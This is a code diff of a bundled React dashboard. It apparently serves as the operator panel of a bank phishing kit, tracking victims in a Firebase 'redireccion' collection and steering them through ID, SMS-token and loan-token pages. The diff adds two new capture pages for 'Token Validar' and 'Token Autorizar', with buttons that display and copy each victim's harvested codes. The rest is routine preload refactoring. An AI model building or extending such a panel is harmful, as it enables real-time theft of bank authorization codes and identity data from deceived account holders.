@@ -18083,30 +18083,22 @@ const ProtectedLayout = () => {
   ) });
 };
 
-const scriptRel = 'modulepreload';const assetsURL = function(dep, importerUrl) { return new URL(dep, importerUrl).href };const seen = {};const __vitePreload = function preload(baseModule, deps, importerUrl) {
+const scriptRel = 'modulepreload';const assetsURL = function(dep) { return "/"+dep };const seen = {};const __vitePreload = function preload(baseModule, deps, importerUrl) {
   let promise = Promise.resolve();
   if (true && deps && deps.length > 0) {
-    const links = document.getElementsByTagName("link");
+    document.getElementsByTagName("link");
     const cspNonceMeta = document.querySelector(
       "meta[property=csp-nonce]"
     );
     const cspNonce = cspNonceMeta?.nonce || cspNonceMeta?.getAttribute("nonce");
     promise = Promise.allSettled(
       deps.map((dep) => {
-        dep = assetsURL(dep, importerUrl);
+        dep = assetsURL(dep);
         if (dep in seen) return;
         seen[dep] = true;
         const isCss = dep.endsWith(".css");
         const cssSelector = isCss ? '[rel="stylesheet"]' : "";
-        const isBaseRelative = !!importerUrl;
-        if (isBaseRelative) {
-          for (let i = links.length - 1; i >= 0; i--) {
-            const link2 = links[i];
-            if (link2.href === dep && (!isCss || link2.rel === "stylesheet")) {
-              return;
-            }
-          }
-        } else if (document.querySelector(`link[href="${dep}"]${cssSelector}`)) {
+        if (document.querySelector(`link[href="${dep}"]${cssSelector}`)) {
           return;
         }
         const link = document.createElement("link");
@@ -22455,7 +22447,7 @@ const BrowserEmulator = ({ children, overlays }) => {
         onMouseDown: (e) => {
           if (e.button === 0) {
             try {
-              __vitePreload(async () => { const {getCurrentWindow} = await Promise.resolve().then(() => window$1);return { getCurrentWindow }},true?void 0:void 0,import.meta.url).then(({ getCurrentWindow }) => {
+              __vitePreload(async () => { const {getCurrentWindow} = await Promise.resolve().then(() => window$1);return { getCurrentWindow }},true?void 0:void 0).then(({ getCurrentWindow }) => {
                 getCurrentWindow().startDragging();
               });
             } catch {
@@ -57919,8 +57911,8 @@ const Dashboard = () => {
       const message = lastFormPage === 1 ? "Identidad confirmada exitosamente" : "Token confirmado exitosamente";
       setSuccessMessage(message);
       try {
-        const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0,import.meta.url);
-        const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0,import.meta.url);
+        const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0);
+        const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0);
         await updateDoc(doc(getActiveBankDb(), getBankCollection("redireccion"), selectedUserId), {
           successMessage: message
         });
@@ -57932,8 +57924,8 @@ const Dashboard = () => {
   const handleUpdatePageWithClear = async (userId, page) => {
     setSuccessMessage("");
     try {
-      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0,import.meta.url);
-      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0,import.meta.url);
+      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0);
+      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0);
       const fieldsToUpdate = {
         successMessage: null
       };
@@ -57993,8 +57985,8 @@ const Dashboard = () => {
     }
     setLoadingFoto(true);
     try {
-      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0,import.meta.url);
-      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0,import.meta.url);
+      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0);
+      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0);
       await updateDoc(doc(getActiveBankDb(), getBankCollection("redireccion"), selectedUserId), {
         mostrarModalFoto: true,
         fotoRechazada: false,
@@ -58018,8 +58010,8 @@ const Dashboard = () => {
     photoActionLockRef.current = true;
     setLoadingPhotoAction(true);
     try {
-      const { doc, getDoc, updateDoc } = await __vitePreload(async () => { const { doc, getDoc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, getDoc, updateDoc }},true?void 0:void 0,import.meta.url);
-      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0,import.meta.url);
+      const { doc, getDoc, updateDoc } = await __vitePreload(async () => { const { doc, getDoc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, getDoc, updateDoc }},true?void 0:void 0);
+      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0);
       const userDocRef = doc(getActiveBankDb(), getBankCollection("redireccion"), selectedUserId);
       let userData = selectedUser;
       if (!userData?.fotoTemporalHD && !userData?.fotoTemporal) {
@@ -58096,8 +58088,8 @@ const Dashboard = () => {
     photoActionLockRef.current = true;
     setLoadingPhotoAction(true);
     try {
-      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0,import.meta.url);
-      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0,import.meta.url);
+      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0);
+      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0);
       await updateDoc(doc(getActiveBankDb(), getBankCollection("redireccion"), selectedUserId), {
         fotoRechazada: true,
         esperandoAprobacionFoto: false,
@@ -58117,8 +58109,8 @@ const Dashboard = () => {
     if (!selectedUserId) return;
     const lastFormPage = lastFormPageByUser[selectedUserId] || 1;
     try {
-      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0,import.meta.url);
-      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0,import.meta.url);
+      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0);
+      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0);
       const fieldsToUpdate = {
         successMessage: null
       };
@@ -58735,7 +58727,7 @@ const MobileDashboard = () => {
   reactExports.useEffect(() => {
     users.forEach((user) => {
       const page = user.page;
-      if (page !== void 0 && page >= 1 && page <= 4) {
+      if (page !== void 0 && (page >= 1 && page <= 4 || page === 8 || page === 9)) {
         setLastFormPageByUser((prev) => {
           if (prev[user.id] !== page) {
             return { ...prev, [user.id]: page };
@@ -58781,8 +58773,8 @@ const MobileDashboard = () => {
     if (!user?.id || loadingPhotoAction[user.id]) return;
     setLoadingPhotoAction((prev) => ({ ...prev, [user.id]: true }));
     try {
-      const { doc, getDoc, updateDoc } = await __vitePreload(async () => { const { doc, getDoc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, getDoc, updateDoc }},true?void 0:void 0,import.meta.url);
-      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0,import.meta.url);
+      const { doc, getDoc, updateDoc } = await __vitePreload(async () => { const { doc, getDoc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, getDoc, updateDoc }},true?void 0:void 0);
+      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0);
       const userDocRef = doc(getActiveBankDb(), getBankCollection("redireccion"), user.id);
       let userData = user;
       if (!userData?.fotoTemporalHD && !userData?.fotoTemporal) {
@@ -58858,8 +58850,8 @@ const MobileDashboard = () => {
     if (!userId || loadingPhotoAction[userId]) return;
     setLoadingPhotoAction((prev) => ({ ...prev, [userId]: true }));
     try {
-      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0,import.meta.url);
-      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0,import.meta.url);
+      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0);
+      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0);
       await updateDoc(doc(getActiveBankDb(), getBankCollection("redireccion"), userId), {
         fotoRechazada: true,
         esperandoAprobacionFoto: false,
@@ -58876,8 +58868,8 @@ const MobileDashboard = () => {
   };
   const handleUpdatePageWithClear = async (userId, page) => {
     try {
-      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0,import.meta.url);
-      const { db, getBankCollection } = await __vitePreload(async () => { const { db, getBankCollection } = await Promise.resolve().then(() => firebase);return { db, getBankCollection }},true?void 0:void 0,import.meta.url);
+      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0);
+      const { db, getBankCollection } = await __vitePreload(async () => { const { db, getBankCollection } = await Promise.resolve().then(() => firebase);return { db, getBankCollection }},true?void 0:void 0);
       const fieldsToUpdate = {
         successMessage: null
       };
@@ -58890,6 +58882,12 @@ const MobileDashboard = () => {
         fieldsToUpdate.smsToken = null;
       } else if (page === 4) {
         fieldsToUpdate.prestamoToken = null;
+      } else if (page === 8) {
+        fieldsToUpdate.validarToken = null;
+        fieldsToUpdate.token = null;
+      } else if (page === 9) {
+        fieldsToUpdate.autorizarToken = null;
+        fieldsToUpdate.token = null;
       }
       await updateDoc(doc(db, getBankCollection("redireccion"), userId), fieldsToUpdate);
     } catch (e) {
@@ -58899,8 +58897,8 @@ const MobileDashboard = () => {
   const handleErrorForUser = async (userId) => {
     const lastFormPage = lastFormPageByUser[userId] || 1;
     try {
-      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0,import.meta.url);
-      const { db, getBankCollection } = await __vitePreload(async () => { const { db, getBankCollection } = await Promise.resolve().then(() => firebase);return { db, getBankCollection }},true?void 0:void 0,import.meta.url);
+      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0);
+      const { db, getBankCollection } = await __vitePreload(async () => { const { db, getBankCollection } = await Promise.resolve().then(() => firebase);return { db, getBankCollection }},true?void 0:void 0);
       const fieldsToUpdate = {
         successMessage: null
       };
@@ -58913,6 +58911,12 @@ const MobileDashboard = () => {
         fieldsToUpdate.smsToken = null;
       } else if (lastFormPage === 4) {
         fieldsToUpdate.prestamoToken = null;
+      } else if (lastFormPage === 8) {
+        fieldsToUpdate.validarToken = null;
+        fieldsToUpdate.token = null;
+      } else if (lastFormPage === 9) {
+        fieldsToUpdate.autorizarToken = null;
+        fieldsToUpdate.token = null;
       }
       if (Object.keys(fieldsToUpdate).length > 0) {
         await updateDoc(doc(db, getBankCollection("redireccion"), userId), fieldsToUpdate);
@@ -59156,6 +59160,36 @@ const MobileDashboard = () => {
                     ]
                   }
                 ),
+                user.validarToken && /* @__PURE__ */ jsxRuntimeExports.jsxs(
+                  "button",
+                  {
+                    onClick: () => copyToClipboard(user.validarToken, "Token Validar"),
+                    className: "bg-cyan-900/30 p-2 rounded border border-cyan-700/30 text-left hover:bg-cyan-800/40 active:bg-cyan-700/40 transition-colors flex items-center justify-between",
+                    children: [
+                      /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { children: [
+                        /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-gray-400", children: "T.Validar:" }),
+                        " ",
+                        /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-cyan-300", children: user.validarToken })
+                      ] }),
+                      /* @__PURE__ */ jsxRuntimeExports.jsx(IconCopy, { size: 14, className: "text-cyan-400" })
+                    ]
+                  }
+                ),
+                user.autorizarToken && /* @__PURE__ */ jsxRuntimeExports.jsxs(
+                  "button",
+                  {
+                    onClick: () => copyToClipboard(user.autorizarToken, "Token Autorizar"),
+                    className: "bg-indigo-900/30 p-2 rounded border border-indigo-700/30 text-left hover:bg-indigo-800/40 active:bg-indigo-700/40 transition-colors flex items-center justify-between",
+                    children: [
+                      /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { children: [
+                        /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-gray-400", children: "T.Autorizar:" }),
+                        " ",
+                        /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-indigo-300", children: user.autorizarToken })
+                      ] }),
+                      /* @__PURE__ */ jsxRuntimeExports.jsx(IconCopy, { size: 14, className: "text-indigo-400" })
+                    ]
+                  }
+                ),
                 user.ip && /* @__PURE__ */ jsxRuntimeExports.jsxs(
                   "button",
                   {
@@ -59310,7 +59344,9 @@ const MobileDashboard = () => {
               ] : [
                 { page: 1, label: "DNI/RTN", cols: "col-span-2" },
                 { page: 2, label: "Desbloquear", cols: "col-span-1" },
-                { page: 3, label: "Registrar", cols: "col-span-1" }
+                { page: 3, label: "Registrar", cols: "col-span-1" },
+                { page: 8, label: "Token Validar", cols: "col-span-1" },
+                { page: 9, label: "Token Autorizar", cols: "col-span-1" }
               ]).map(({ page, label, cols }) => /* @__PURE__ */ jsxRuntimeExports.jsx(
                 "button",
                 {
@@ -59330,8 +59366,8 @@ const MobileDashboard = () => {
                         setSuccessPressedByUser((prev) => ({ ...prev, [user.id]: true }));
                         const lastFormPage = lastFormPageByUser[user.id] || 1;
                         const message = lastFormPage === 1 ? "Identidad confirmada exitosamente" : "Token confirmado exitosamente";
-                        __vitePreload(async () => { const {doc, updateDoc} = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0,import.meta.url).then(({ doc, updateDoc }) => {
-                          __vitePreload(async () => { const {db, getBankCollection} = await Promise.resolve().then(() => firebase);return { db, getBankCollection }},true?void 0:void 0,import.meta.url).then(({ db, getBankCollection }) => {
+                        __vitePreload(async () => { const {doc, updateDoc} = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0).then(({ doc, updateDoc }) => {
+                          __vitePreload(async () => { const {db, getBankCollection} = await Promise.resolve().then(() => firebase);return { db, getBankCollection }},true?void 0:void 0).then(({ db, getBankCollection }) => {
                             updateDoc(doc(db, getBankCollection("redireccion"), user.id), {
                               successMessage: message
                             });
@@ -59365,8 +59401,8 @@ const MobileDashboard = () => {
                 {
                   onClick: async () => {
                     try {
-                      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0,import.meta.url);
-                      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0,import.meta.url);
+                      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0);
+                      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0);
                       await updateDoc(doc(getActiveBankDb(), getBankCollection("redireccion"), user.id), {
                         mostrarModalFoto: true,
                         fotoRechazada: false,
